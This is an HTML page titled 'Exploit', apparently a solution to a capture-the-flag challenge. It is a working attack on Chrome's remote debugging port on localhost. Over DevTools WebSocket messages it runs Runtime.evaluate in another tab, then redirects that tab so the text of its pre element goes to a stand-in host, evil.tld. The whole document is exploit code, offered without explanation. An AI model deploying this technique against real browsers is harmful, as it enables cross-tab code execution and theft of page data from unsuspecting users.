<head>
<title>Exploit</title>
</head>
<body>
<iframe src="http://127.0.0.1:9222/json/list" name="iframe" id="iframe" frameborder="0" marginheight="0px" marginwidth="0px" height="400" width="600"></iframe>
<div id="divID"></div>
<script>
    var div = document.getElementById('divID');
    div.innerHTML += "start ";    
    //ADD_ID_HERE
    let id = "ADD_ID_HERE";
    let url = "ws://127.0.0.1:9222/devtools/page/"+id;
    let socket1 = new WebSocket(url);    
    var message1 = {
        "id": 1336,
        "method": "Runtime.evaluate",
        "params": {
           "expression": "window.location.replace('http://127.0.0.1:9222/json/list');"
        }
    } 
    var message = {
        "id": 1337,
        "method": "Runtime.evaluate",
         "params": {
            "expression": "jsontext=JSON.parse(document.body.innerText);var needle='https://www.cscg.de/';var wsurl='';for (var i = 0; i < jsontext.length; i++){;if (jsontext[i].url == needle){;wsurl=jsontext[i].webSocketDebuggerUrl;};};var stri =`'`+'Cyber onload=Cyber onload=window.location.replace(`http://evil.tld/`+document.getElementsByTagName(`pre`)[0].innerText)'+`'`;var documen='document.title='+stri;var message2 = {'id': 1737,'method': 'Runtime.evaluate', 'params': { 'expression': documen}};var socket4=new WebSocket(wsurl); setTimeout(() => {  socket4.send(JSON.stringify(message2)); }, 1000);"
         }
    }
    socket1.onerror   = (error) => div.innerHTML += `[error1] ${error.message}`;
    socket1.onmessage = (event) => div.innerHTML += `[message1] ${event.data}`;
    socket1.onopen = (e) => {
        div.innerHTML += "[init1] Connection established";
        socket1.send(JSON.stringify(message1));
        //Send with 3 seconds delay
        setTimeout(() => {  socket1.send(JSON.stringify(message));div.innerHTML += "send2"; }, 3000);
    }
  
    div.innerHTML += " end";
</script>

</body>